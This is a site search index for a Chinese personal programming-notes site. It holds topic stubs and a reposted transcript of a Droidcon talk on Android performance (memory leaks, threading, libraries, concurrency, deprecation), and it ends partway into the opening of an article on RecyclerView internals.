{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u5fae\u7ad9 \u6b22\u8fce\u4f7f\u7528\u5fae\u7ad9,\u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u6811\u8393\u6d3e\u7528\u5230\u7684\u77e5\u8bc6 \u6811\u8393\u6d3e \u5916\u7f51\u7aef\u53e3 BT\u4e0b\u8f7d DDNS\u670d\u52a1 Samba ... Bash \u6587\u4ef6\u7ba1\u7406 # ls cat mkdir rmdir ... \u6743\u9650\u7ba1\u7406\u3000 # chown chmod passwd ... \u5b57\u7b26\u5904\u7406/ grep sed awk ... # \u5176\u5b83\u7c7b\u578b C/C++ * \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5 Java * \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5 Python * \u722c\u866b * Sagemath * \u7070\u5e3d\u5b50 \u7b97\u6cd5 * \u5206\u6cbb * \u52a8\u6001\u89c4\u5212 * \u56fe\u7684\u641c\u7d22 * \u80cc\u5305 * \u7ec4\u5408\u6570\u5b66 \u6c47\u7f16 * \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5","title":"\u5fae\u7ad9"},{"location":"#_1","text":"\u6b22\u8fce\u4f7f\u7528\u5fae\u7ad9,\u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u6811\u8393\u6d3e\u7528\u5230\u7684\u77e5\u8bc6","title":"\u5fae\u7ad9"},{"location":"#_2","text":"\u5916\u7f51\u7aef\u53e3 BT\u4e0b\u8f7d DDNS\u670d\u52a1 Samba ...","title":"\u6811\u8393\u6d3e"},{"location":"#bash","text":"\u6587\u4ef6\u7ba1\u7406 # ls cat mkdir rmdir ... \u6743\u9650\u7ba1\u7406\u3000 # chown chmod passwd ... \u5b57\u7b26\u5904\u7406/ grep sed awk ... # \u5176\u5b83\u7c7b\u578b","title":"Bash"},{"location":"#cc","text":"* \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5","title":"C/C++"},{"location":"#java","text":"* \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5","title":"Java"},{"location":"#python","text":"* \u722c\u866b * Sagemath * \u7070\u5e3d\u5b50","title":"Python"},{"location":"#_3","text":"* \u5206\u6cbb * \u52a8\u6001\u89c4\u5212 * \u56fe\u7684\u641c\u7d22 * \u80cc\u5305 * \u7ec4\u5408\u6570\u5b66","title":"\u7b97\u6cd5"},{"location":"#_4","text":"* \u8bed\u6cd5 * \u6570\u636e\u7ed3\u6784 * \u8c03\u8bd5","title":"\u6c47\u7f16"},{"location":"about/","text":"\u5173\u4e8e \u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u6811\u8393\u6d3e\u7528\u5230\u7684\u77e5\u8bc6","title":"\u5173\u4e8e"},{"location":"about/#_1","text":"\u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u6811\u8393\u6d3e\u7528\u5230\u7684\u77e5\u8bc6","title":"\u5173\u4e8e"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/","text":"10 Ways to Improve Your Android App's Performance Everyone knows how important performance is for the success of an app, but how do you get your app running at peak performance? In his talk at DroidCon NYC 2015, Boris Farber brings his wealth of experience working with Android APIs at Google to help you avoid ten common pitfalls and keep your app running as fast as humanly possible. Learn how to avoid falling victim to long launch times and bad scrolling, in order to create a responsive app with a smoother user experience. Save the date for Droidcon SF in March \u2014 a conference with best-in-class presentations from leaders in all parts of the Android ecosystem. Introduction (0:00) Hi, my name is Boris; I am a Developer Advocate at Google, and I\u2019m focusing on performance-heavy apps. This post is the best practices and the mistakes I have seen while consulting partners on their Android apps. If you have a small app, read on, but you will likely only need this information when your app gets larger. The rules of thumb that I have found from working with data intensive Android apps. Usually, the app that I am looking at has a long launch time, janky scrolling, or even in the worst case, unresponsiveness. We are going to see a bunch of ways how can we make those things better and faster because, at the end of the day, we all want to be successful. Activity Leaks (1:17) Our first friend in things that we need to fix is Activity leaks, and let\u2019s see how they happen. Activity leaks, or memory leaks in general, are extremely dangerous. Why do they happen? If we hold the reference in our code to an unused Activity, we hold all of the Activity\u2019s layout and, in turn, all of its views. That results in many, many pixels you don\u2019t want to store in memory. Another really problematic thing is keeping static references. Don\u2019t forget, both Activities and fragments have a life cycle. Once we have a static reference, this Activity, or fragment, will not be garbage collected. This is why static references are dangerous, they become dangling pointers. m_staticActivity = staticFragment.getActivity() I have seen this code too many times, unfortunately, and on one occasion it took two weeks of my life to understand why the app was crashing at unexpected times. Not my favorite activity to run after those bugs. I hope it is not yours. We start with the first, easiest way to make a memory leak, which is by leaking listeners. Say we have the following code, public class LeakActivity extends Activity and guess what? We have some NastyManager , which is unfortunately a singleton, and we add activity to this manager by addListener(this) . public class LeakActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); NastyManager.getInstance().addListener(this); } } If you want to see more details in the blog post that I posted in Android Developers, maybe three, four weeks ago, what happens is NastyManager holds our Activity. So, the Activity might not be presented, but it will be in memory, and this is a really, really bad idea. Let me show you how to fix it pretty easily. @Override public void onDestroy() { super.onDestroy(); NastyManager.getInstance().removeListener(this); } onDestroy , for our Activity, we just unregister ourselves. Of course, we have a better discussion, should we use singletons in the first place? Usually, we shouldn\u2019t, but sometimes it\u2019s the only solution. That\u2019s why software engineering is interesting. We have a tradeoff, and we have a design. So please, don\u2019t forget to remove your listeners. In order for us deeper to understand why these problems happen, you need to remember the structure. What does it mean to be an inner class? We have a Handler, which we\u2019ll look at shortly, which is an inner non-static class, to the scoping class, which is Activity. As we are going to see shortly, as long as Handler alive, the bounding Activity is alive. If you don\u2019t believe me, try to read the JVM spec, this is funny. Here is another memory leak. To represent the example, we have a Activity, and inside we have a Handler. public class MainActivity extends Activity { //... Handler handler; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); //... handler = new Handler() { @Override public void handleMessage(Message msg) { } } } Excellent way to communicate things. Handler, asynchronous communication, thread-safe, all good things. What happens if you have the following code? handler.postDelayed next hour. What does it mean? It means, as long as a Handler has a message, it\u2019s alive. And if a Handler is alive, it\u2019s enclosing Activity is alive, even though we might not need it but we pay for the memory. This is what we call a memory leak. Let\u2019s see how we fix it. I have a confession to make, the fix is a little bit tricky. We really recommend using WeakReference . What\u2019s a WeakReference ? WeakReference , if it\u2019s the only reference to underlying object, the garbage collector will clean it. That\u2019s it \u2013 truly simple. Here, We declare a Handler with a WeakReference , so if the Handler is alive and we don\u2019t need Activity, and the WeakReference that the Handler holds is the only reference. The Activity is cleaned. I admit this fix is a little bit tricky. This is the ecosystem that we are living in. private static class MyHandler extends Handler { private final WeakReference<MainActivity> mActivity; // ... public MyHandler(MainActivity activity) { mActivity = new WeakReference<MainActivity>(activity); //... } @Override public void handleMessage(Message msg) { } //... } To recap, we have an inner class, like Handler. Inner non-static class can\u2019t live in isolation from the scoping class, which is Activity. So please, when you come back to your code, take a look at all your inner classes and make sure that you don\u2019t have a memory leak there. You and your users will thank you later. In general, please prefer static to non-static inner classes. Basically the difference is non-static inner class is not bounded to its enclosing class, such as Activity. Note that both classes, Handler and Activity, have a different lifetime. This is one of the reasons for the most, most annoying bugs that I see. Most of the time I am trying to make you all successful on Android, but I also work with companies trying to sort out their problems, and many of them come to me with memory leaks. What Can You Do About Activity Leaks? (8:37) Please remove away static references. Consider using event bus to decoup our listeners from senders. Please unregister your listeners. Please prefer static inner classes to non-static ones. Please do code reviews. Based on my personal experience, the code reviews are so far the most effective way to find memory leaks. Understand your application structure. Use tools such as MAT, Eclipse Analyzer, LeakCanary. Print logs on callbacks. Scrolling (10:05) The secret for effective scrolling is as follows: use UI thread only for UI. This alone would solve 99% of your problems. Never do the following on UI thread: Never load images. Never do networking calls. Never parse JSON. Never access databases. There are means to do them. Some of them even fast. For images, networking, JSON, use libraries. There are a lot of community solutions, and some of the best presenters are even presenting in this Droidcon conference. For database access, consider using Loader, who actually do batch updates to databases, and to make you focus on what\u2019s important in your app. Images (11:26) As far as image libraries go, the following typically provide the required functionality, based on our experience working with leading companies: Glide , Picasso , Fresco . Just know that they have all different design trade-offs, especially around the large images count. Memory (12:13) We managed to convince ourselves that the bitmaps are tricky, basically because of their large size and fragmented heap. When I was responsible for an app with a lot of images on the pre-4.0 devices, that made life hard. Also, memory management is tricky. Some of the stuff, it\u2019s better to put in file, and some of the stuff it\u2019s better to keep in memory. Please note, we have the class LRUCache which is an efficient cache implementation. Networking (12:54) First, the problem with Java networking, which made its way into Android, is the tricky APIs. In case you don\u2019t know, many java.net API calls are blocking. This is another excellent reason to not do networking on the UI thread. Remember that stream calls are blocking, and to make things even more interesting, equals of the URL class result in DNS call \u2013 this is time that you are paying. Use libraries, or any other threading solution that fits to your program. The hard part about the networking is they\u2019re doing Async Http. If I remember correctly from Android 4.4, OkHttp is the part of a Android sources, however, if you feel that you need the latest version of OkHttp with some stuff that hasn\u2019t made its way into the official Android, consider bundling your own. There is another public library which is made by Google, Volley . There is a excellent library made by Square called Retrofit for your REST calls, all the solutions you have to make your app network-friendly successful. Large JSON (14:35) This is another component of things you shouldn\u2019t do on UI thread because parsing large JSON has a performance effect, especially if converted to a class with a lot of getters and setters. What we have found so far is if you have a small JSON, the GSON , also made by Google, gives the best result.However, I consider a rule of thumb, maybe less than 500k could be small, anything larger could be considered as large. And also, don\u2019t forget, this is a moving target. On a strong device such as Nexus 6, something we consider as large is small, but if your app has to support previous devices you should take it with a grain of salt. For large JSON, I would say the best to use or the fastest to use are Jackson and Instagram JSON Parser . They did really interesting work of generating the stream parser code. From company feedback, ig-json-parser gives the best results so far. Looper.myLooper() == Looper.getMainLooper() is the code you can use to make sure you are not on the UI thread. What can we do to speed up our scrolling? (16:56) Please keep UI thread only for UI. Understand concurrency APIs. Please use libraries. Use Loaders The reason to use libraries is because the code is tricky. That doesn\u2019t mean you can\u2019t write a good library by yourself, however, if I were to choose should I focus on something which exists whether, say, providing more value to my business, I will definitely go for providing more value to the business. Developing a library is something which is expensive, and if you have libraries right off the shelf, consider using them. They are supported, maintained and have a community behind them. Concurrency APIs (18:00) I find these really important to understand in order to make your app fast and responsive. People including myself unfortunately forget that Service methods run on UI thread. Please consider using IntentService , AsyncTask , Executors , Handlers and Loopers . Let\u2019s focus on the trade-offs of the first three. IntentService (19:07) In my previous company, I used the IntentService to perform uploading to the server. IntentService is a single-threaded, simple, one job at a time. We don\u2019t have any job system, meaning we can\u2019t keep track for jobs, and we have essentially no normal way to stop it. If you have some large operation that doesn\u2019t touch UI, consider using it. What I did in my previous company was doing upload to one IntentService and showing a notification icon once I\u2019m done. AsyncTask (19:56) The AsyncTask is a solution if you have a thing that you need, or basically something that you don\u2019t care about the result of outside the UI. However, please note that even though AsyncTask is relatively easy, it has some dark corners. Activity life-cycles, especially during rotation, need to be closed and dismissed. Otherwise it could cause memory leaks, and as we have seen on our first bullet, Activity memory leaks are not fun. Another thing that I have problems with is it was changed rapidly around the Honeycomb and Gingerbread. As a result, I forked the AsyncTask sources from the Android source tray, bundled it in my APK, and that\u2019s it. Sometimes, this could be solution. Executor Framework (21:11) This is another friend in the concurrency APIs that we got from Java 6 and on, this is essentially a thread pool managed by the system, which has callbacks, futures and mostly I use it for MapReduce tasks. Meaning, if you have a big job and you want to break it into small pieces and give each piece a thread, the Executor Framework could be your best solution. For instance, I used it when I wrote my open source git project three or four years ago. Even though it was developed on Nexus S, in the dark ages, when we ran it on Nexus 6, it performed extremely well. What can you do about concurrency APIs? (22:07) Please learn and understand the APIs and tradeoffs. Please make sure that you map the correct solution to the right problem. Understand what your problems are and see, which of the API that I presented before, can defeat the best. Please refactor your code Deprecation (22:42) We all know what deprecation is and why we should avoid it. Not only is deprecation bad, system abuse is bad. Here are some classic examples: Please don\u2019t call private APIs by reflection. Please don\u2019t call private native methods from the NDK and C level. Please don\u2019t just Runtime.exec to communicate with processes. adb shell am to communicate with other processes is not something we want to support. I have seen zillions of bugs, especially when we introduced Android L, when we blocked this feature. Abusing private APIs, which are meant to be private, is bound to lead to failure. Deprecation means that some API will be removed and, usually one or two days before the major release, your app will not work. To make things even worse, sometimes if you are dependent on the old version of a library, there is no way to update both APIs and tools. Unfortunately, I saw a company whose whole application was dependent on a library that could only be built with Android 3.0. Android 3.0 was a long, long, long time ago. This is a bad thing. Please don\u2019t do it. Most of the time there is a compelling reason for us to deprecate APIs to improve security, correctness, and of course, performance. To avoid issues with deprecations: Know and use proper APIs. Refactor your dependencies. Don\u2019t abuse the system. Update your dependencies and tools. Newer is better. Prefer Toolbar to ActionBar, and prefer RecyclerView, especially for animations, because it\u2019s optimized for that. As a latest and greatest example, if you don\u2019t know, but we removed the Apache Http connection at M. By the way, it\u2019s still available as a gradle dependency. Please use HttpURLConnection. It has a simpler API, smaller size, transparent compression, better response caching, and other cool things. Architecture (27:03) Bugs around a lifecycle in architecture are the most prominent and annoying. To avoid these, learn the app components life cycle. What are the flags around Activities, what are fragments, what are stated fragments, what is task, and what are flags. Read documentation and add simple logs on callbacks, playing around with flags. Please work with the framework and not against it. Framework components have a purpose, which are specific semantics, and use when these semantics are desired. There\u2019s a reason we have broadcast receivers. There is a reason a service is different from an activity. In general, avoid over-engineering. Unfortunately, I have seen too many cases when I talk to companies about their architecture, and they just create unnecessary layers of mud above the framework components. Don\u2019t do it. Keep it simple. Then, your app performs better, and other good things. I\u2019m also often asked, \u201cwhat it better? Should I pick Picasso or Glide? Should I pick Volley or OkHttp?\u201d And usually there is no right answer or 100% correct answer. However, the following checklist is something that I\u2019m using when I\u2019m discussing with the companies what they should do in terms of architecture. Make sure it solves your problem. Make sure it plays nicely with your current dependencies. Please know dex method count. Nowadays it\u2019s less of a problem since we introduced the multi-dex flag, however, it\u2019s always good to be aware of it. Please check the dependencies. The last thing that you want is a dependency clash. You have version Z of some library, but the third-party library requires a different version. This is what is called, at least in the Windows world, the DLL Hell. I guess in the Java world its more of a Jar hell. Try to avoid it. Know the maintenance. All in all, speaking of architecture and design, the best idea is to design your app sleeping most of the time and to be extremely responsive when it\u2019s awake. For me, the best app is the app that gets out of my way in less than 10 seconds. I thus recommend you to be consistent, as consistency is the cornerstone of every architecture. Make sure you can get people on board quickly. It always helps to have somebody or someone who is experienced in that architecture before, and in general please pick your dependencies wisely. \u539f\u6587\u94fe\u63a5\uff1a https://academy.realm.io/posts/droidcon-farber-improving-android-app-performance/","title":"10 Ways to Improve Your Android App's Performance"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#10-ways-to-improve-your-android-apps-performance","text":"Everyone knows how important performance is for the success of an app, but how do you get your app running at peak performance? In his talk at DroidCon NYC 2015, Boris Farber brings his wealth of experience working with Android APIs at Google to help you avoid ten common pitfalls and keep your app running as fast as humanly possible. Learn how to avoid falling victim to long launch times and bad scrolling, in order to create a responsive app with a smoother user experience. Save the date for Droidcon SF in March \u2014 a conference with best-in-class presentations from leaders in all parts of the Android ecosystem.","title":"10 Ways to Improve Your Android App's Performance"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#introduction-000","text":"Hi, my name is Boris; I am a Developer Advocate at Google, and I\u2019m focusing on performance-heavy apps. This post is the best practices and the mistakes I have seen while consulting partners on their Android apps. If you have a small app, read on, but you will likely only need this information when your app gets larger. The rules of thumb that I have found from working with data intensive Android apps. Usually, the app that I am looking at has a long launch time, janky scrolling, or even in the worst case, unresponsiveness. We are going to see a bunch of ways how can we make those things better and faster because, at the end of the day, we all want to be successful.","title":"Introduction (0:00)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#activity-leaks-117","text":"Our first friend in things that we need to fix is Activity leaks, and let\u2019s see how they happen. Activity leaks, or memory leaks in general, are extremely dangerous. Why do they happen? If we hold the reference in our code to an unused Activity, we hold all of the Activity\u2019s layout and, in turn, all of its views. That results in many, many pixels you don\u2019t want to store in memory. Another really problematic thing is keeping static references. Don\u2019t forget, both Activities and fragments have a life cycle. Once we have a static reference, this Activity, or fragment, will not be garbage collected. This is why static references are dangerous, they become dangling pointers. m_staticActivity = staticFragment.getActivity() I have seen this code too many times, unfortunately, and on one occasion it took two weeks of my life to understand why the app was crashing at unexpected times. Not my favorite activity to run after those bugs. I hope it is not yours. We start with the first, easiest way to make a memory leak, which is by leaking listeners. Say we have the following code, public class LeakActivity extends Activity and guess what? We have some NastyManager , which is unfortunately a singleton, and we add activity to this manager by addListener(this) . public class LeakActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); NastyManager.getInstance().addListener(this); } } If you want to see more details in the blog post that I posted in Android Developers, maybe three, four weeks ago, what happens is NastyManager holds our Activity. So, the Activity might not be presented, but it will be in memory, and this is a really, really bad idea. Let me show you how to fix it pretty easily. @Override public void onDestroy() { super.onDestroy(); NastyManager.getInstance().removeListener(this); } onDestroy , for our Activity, we just unregister ourselves. Of course, we have a better discussion, should we use singletons in the first place? Usually, we shouldn\u2019t, but sometimes it\u2019s the only solution. That\u2019s why software engineering is interesting. We have a tradeoff, and we have a design. So please, don\u2019t forget to remove your listeners. In order for us deeper to understand why these problems happen, you need to remember the structure. What does it mean to be an inner class? We have a Handler, which we\u2019ll look at shortly, which is an inner non-static class, to the scoping class, which is Activity. As we are going to see shortly, as long as Handler alive, the bounding Activity is alive. If you don\u2019t believe me, try to read the JVM spec, this is funny. Here is another memory leak. To represent the example, we have a Activity, and inside we have a Handler. public class MainActivity extends Activity { //... Handler handler; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); //... handler = new Handler() { @Override public void handleMessage(Message msg) { } } } Excellent way to communicate things. Handler, asynchronous communication, thread-safe, all good things. What happens if you have the following code? handler.postDelayed next hour. What does it mean? It means, as long as a Handler has a message, it\u2019s alive. And if a Handler is alive, it\u2019s enclosing Activity is alive, even though we might not need it but we pay for the memory. This is what we call a memory leak. Let\u2019s see how we fix it. I have a confession to make, the fix is a little bit tricky. We really recommend using WeakReference . What\u2019s a WeakReference ? WeakReference , if it\u2019s the only reference to underlying object, the garbage collector will clean it. That\u2019s it \u2013 truly simple. Here, We declare a Handler with a WeakReference , so if the Handler is alive and we don\u2019t need Activity, and the WeakReference that the Handler holds is the only reference. The Activity is cleaned. I admit this fix is a little bit tricky. This is the ecosystem that we are living in. private static class MyHandler extends Handler { private final WeakReference<MainActivity> mActivity; // ... public MyHandler(MainActivity activity) { mActivity = new WeakReference<MainActivity>(activity); //... } @Override public void handleMessage(Message msg) { } //... } To recap, we have an inner class, like Handler. Inner non-static class can\u2019t live in isolation from the scoping class, which is Activity. So please, when you come back to your code, take a look at all your inner classes and make sure that you don\u2019t have a memory leak there. You and your users will thank you later. In general, please prefer static to non-static inner classes. Basically the difference is non-static inner class is not bounded to its enclosing class, such as Activity. Note that both classes, Handler and Activity, have a different lifetime. This is one of the reasons for the most, most annoying bugs that I see. Most of the time I am trying to make you all successful on Android, but I also work with companies trying to sort out their problems, and many of them come to me with memory leaks.","title":"Activity Leaks (1:17)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#what-can-you-do-about-activity-leaks-837","text":"Please remove away static references. Consider using event bus to decoup our listeners from senders. Please unregister your listeners. Please prefer static inner classes to non-static ones. Please do code reviews. Based on my personal experience, the code reviews are so far the most effective way to find memory leaks. Understand your application structure. Use tools such as MAT, Eclipse Analyzer, LeakCanary. Print logs on callbacks.","title":"What Can You Do About Activity Leaks? (8:37)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#scrolling-1005","text":"The secret for effective scrolling is as follows: use UI thread only for UI. This alone would solve 99% of your problems. Never do the following on UI thread: Never load images. Never do networking calls. Never parse JSON. Never access databases. There are means to do them. Some of them even fast. For images, networking, JSON, use libraries. There are a lot of community solutions, and some of the best presenters are even presenting in this Droidcon conference. For database access, consider using Loader, who actually do batch updates to databases, and to make you focus on what\u2019s important in your app.","title":"Scrolling (10:05)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#images-1126","text":"As far as image libraries go, the following typically provide the required functionality, based on our experience working with leading companies: Glide , Picasso , Fresco . Just know that they have all different design trade-offs, especially around the large images count.","title":"Images (11:26)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#memory-1213","text":"We managed to convince ourselves that the bitmaps are tricky, basically because of their large size and fragmented heap. When I was responsible for an app with a lot of images on the pre-4.0 devices, that made life hard. Also, memory management is tricky. Some of the stuff, it\u2019s better to put in file, and some of the stuff it\u2019s better to keep in memory. Please note, we have the class LRUCache which is an efficient cache implementation.","title":"Memory (12:13)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#networking-1254","text":"First, the problem with Java networking, which made its way into Android, is the tricky APIs. In case you don\u2019t know, many java.net API calls are blocking. This is another excellent reason to not do networking on the UI thread. Remember that stream calls are blocking, and to make things even more interesting, equals of the URL class result in DNS call \u2013 this is time that you are paying. Use libraries, or any other threading solution that fits to your program. The hard part about the networking is they\u2019re doing Async Http. If I remember correctly from Android 4.4, OkHttp is the part of a Android sources, however, if you feel that you need the latest version of OkHttp with some stuff that hasn\u2019t made its way into the official Android, consider bundling your own. There is another public library which is made by Google, Volley . There is a excellent library made by Square called Retrofit for your REST calls, all the solutions you have to make your app network-friendly successful.","title":"Networking (12:54)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#large-json-1435","text":"This is another component of things you shouldn\u2019t do on UI thread because parsing large JSON has a performance effect, especially if converted to a class with a lot of getters and setters. What we have found so far is if you have a small JSON, the GSON , also made by Google, gives the best result.However, I consider a rule of thumb, maybe less than 500k could be small, anything larger could be considered as large. And also, don\u2019t forget, this is a moving target. On a strong device such as Nexus 6, something we consider as large is small, but if your app has to support previous devices you should take it with a grain of salt. For large JSON, I would say the best to use or the fastest to use are Jackson and Instagram JSON Parser . They did really interesting work of generating the stream parser code. From company feedback, ig-json-parser gives the best results so far. Looper.myLooper() == Looper.getMainLooper() is the code you can use to make sure you are not on the UI thread.","title":"Large JSON (14:35)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#what-can-we-do-to-speed-up-our-scrolling-1656","text":"Please keep UI thread only for UI. Understand concurrency APIs. Please use libraries. Use Loaders The reason to use libraries is because the code is tricky. That doesn\u2019t mean you can\u2019t write a good library by yourself, however, if I were to choose should I focus on something which exists whether, say, providing more value to my business, I will definitely go for providing more value to the business. Developing a library is something which is expensive, and if you have libraries right off the shelf, consider using them. They are supported, maintained and have a community behind them.","title":"What can we do to speed up our scrolling? (16:56)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#concurrency-apis-1800","text":"I find these really important to understand in order to make your app fast and responsive. People including myself unfortunately forget that Service methods run on UI thread. Please consider using IntentService , AsyncTask , Executors , Handlers and Loopers . Let\u2019s focus on the trade-offs of the first three.","title":"Concurrency APIs (18:00)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#intentservice-1907","text":"In my previous company, I used the IntentService to perform uploading to the server. IntentService is a single-threaded, simple, one job at a time. We don\u2019t have any job system, meaning we can\u2019t keep track for jobs, and we have essentially no normal way to stop it. If you have some large operation that doesn\u2019t touch UI, consider using it. What I did in my previous company was doing upload to one IntentService and showing a notification icon once I\u2019m done.","title":"IntentService (19:07)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#asynctask-1956","text":"The AsyncTask is a solution if you have a thing that you need, or basically something that you don\u2019t care about the result of outside the UI. However, please note that even though AsyncTask is relatively easy, it has some dark corners. Activity life-cycles, especially during rotation, need to be closed and dismissed. Otherwise it could cause memory leaks, and as we have seen on our first bullet, Activity memory leaks are not fun. Another thing that I have problems with is it was changed rapidly around the Honeycomb and Gingerbread. As a result, I forked the AsyncTask sources from the Android source tray, bundled it in my APK, and that\u2019s it. Sometimes, this could be solution.","title":"AsyncTask (19:56)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#executor-framework-2111","text":"This is another friend in the concurrency APIs that we got from Java 6 and on, this is essentially a thread pool managed by the system, which has callbacks, futures and mostly I use it for MapReduce tasks. Meaning, if you have a big job and you want to break it into small pieces and give each piece a thread, the Executor Framework could be your best solution. For instance, I used it when I wrote my open source git project three or four years ago. Even though it was developed on Nexus S, in the dark ages, when we ran it on Nexus 6, it performed extremely well.","title":"Executor Framework (21:11)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#what-can-you-do-about-concurrency-apis-2207","text":"Please learn and understand the APIs and tradeoffs. Please make sure that you map the correct solution to the right problem. Understand what your problems are and see, which of the API that I presented before, can defeat the best. Please refactor your code","title":"What can you do about concurrency APIs? (22:07)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#deprecation-2242","text":"We all know what deprecation is and why we should avoid it. Not only is deprecation bad, system abuse is bad. Here are some classic examples: Please don\u2019t call private APIs by reflection. Please don\u2019t call private native methods from the NDK and C level. Please don\u2019t just Runtime.exec to communicate with processes. adb shell am to communicate with other processes is not something we want to support. I have seen zillions of bugs, especially when we introduced Android L, when we blocked this feature. Abusing private APIs, which are meant to be private, is bound to lead to failure. Deprecation means that some API will be removed and, usually one or two days before the major release, your app will not work. To make things even worse, sometimes if you are dependent on the old version of a library, there is no way to update both APIs and tools. Unfortunately, I saw a company whose whole application was dependent on a library that could only be built with Android 3.0. Android 3.0 was a long, long, long time ago. This is a bad thing. Please don\u2019t do it. Most of the time there is a compelling reason for us to deprecate APIs to improve security, correctness, and of course, performance. To avoid issues with deprecations: Know and use proper APIs. Refactor your dependencies. Don\u2019t abuse the system. Update your dependencies and tools. Newer is better. Prefer Toolbar to ActionBar, and prefer RecyclerView, especially for animations, because it\u2019s optimized for that. As a latest and greatest example, if you don\u2019t know, but we removed the Apache Http connection at M. By the way, it\u2019s still available as a gradle dependency. Please use HttpURLConnection. It has a simpler API, smaller size, transparent compression, better response caching, and other cool things.","title":"Deprecation (22:42)"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/#architecture-2703","text":"Bugs around a lifecycle in architecture are the most prominent and annoying. To avoid these, learn the app components life cycle. What are the flags around Activities, what are fragments, what are stated fragments, what is task, and what are flags. Read documentation and add simple logs on callbacks, playing around with flags. Please work with the framework and not against it. Framework components have a purpose, which are specific semantics, and use when these semantics are desired. There\u2019s a reason we have broadcast receivers. There is a reason a service is different from an activity. In general, avoid over-engineering. Unfortunately, I have seen too many cases when I talk to companies about their architecture, and they just create unnecessary layers of mud above the framework components. Don\u2019t do it. Keep it simple. Then, your app performs better, and other good things. I\u2019m also often asked, \u201cwhat it better? Should I pick Picasso or Glide? Should I pick Volley or OkHttp?\u201d And usually there is no right answer or 100% correct answer. However, the following checklist is something that I\u2019m using when I\u2019m discussing with the companies what they should do in terms of architecture. Make sure it solves your problem. Make sure it plays nicely with your current dependencies. Please know dex method count. Nowadays it\u2019s less of a problem since we introduced the multi-dex flag, however, it\u2019s always good to be aware of it. Please check the dependencies. The last thing that you want is a dependency clash. You have version Z of some library, but the third-party library requires a different version. This is what is called, at least in the Windows world, the DLL Hell. I guess in the Java world its more of a Jar hell. Try to avoid it. Know the maintenance. All in all, speaking of architecture and design, the best idea is to design your app sleeping most of the time and to be extremely responsive when it\u2019s awake. For me, the best app is the app that gets out of my way in less than 10 seconds. I thus recommend you to be consistent, as consistency is the cornerstone of every architecture. Make sure you can get people on board quickly. It always helps to have somebody or someone who is experienced in that architecture before, and in general please pick your dependencies wisely. \u539f\u6587\u94fe\u63a5\uff1a https://academy.realm.io/posts/droidcon-farber-improving-android-app-performance/","title":"Architecture (27:03)"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/","text":"Anatomy of RecyclerView:a Search for a ViewHolder Pavel Shmakov FollowMar 11, 2017 \u00b715 min readAnatomy of RecyclerView: a Search for a ViewHolder Intro In this series of articles I\u2019m going to share my knowledge of the inner workings of RecyclerView. Why? Just think about it: RecyclerView is needed almost in every modern Android app, so the way developers work with it affects the experience of millions and millions of users. And yet, what kind of educational material on RecyclerView do we have? You can surely find some basic tutorials on how to use RecyclerView, but what about how it works ? The \u201cblack box\u201d approach is definitely not good enough, especially if you are doing complex customizations or optimizing the performance. \u00b9 The \u201cdeepest\u201d material out there is probably the RecyclerView ins and outs talk at Google I/O 2016, which I recommend, but seriously, that\u2019s not even close to \u201cins and outs\u201d, that\u2019s just the tip of the iceberg. My goal is to go deeper than that. I assume that the reader has basic knowledge of RecyclerView, stuff like what LayoutManager is, how to notify Adapter of particular changes in data or how to use item view types. In this first part we will be figuring out what\u2019s going on in just one method inside RecyclerView: getViewByPosition() . This is one of the most crucial bits of source code, and by studying it, we will learn about many aspects of RecyclerView, such as ViewHolder recycling, hidden views, predictive animations and stable ids. You may be surprised to see predictive animations here. Well, the thing is, despite the best efforts of guys at Google to decouple responsibilities of different components of RecyclerView, a lot of \u201cknowledge\u201d is still shared between them, predictive animations being one of those things. There is no way to avoid talking about them at one point or another. So, during laying items out the LayoutManager asks the RecyclerView \u201cplease give me a View at position 8\u201d. And here is what RecycleView does in response: Searches changed scrap Searches attached scrap Searches non-removed hidden views Searches the view cache If Adapter has stable ids, searches attached scrap and view cache again for given id. Searches the ViewCacheExtension Searches the RecycledViewPool If it fails to find a suitable View in all of those places, it creates one by calling 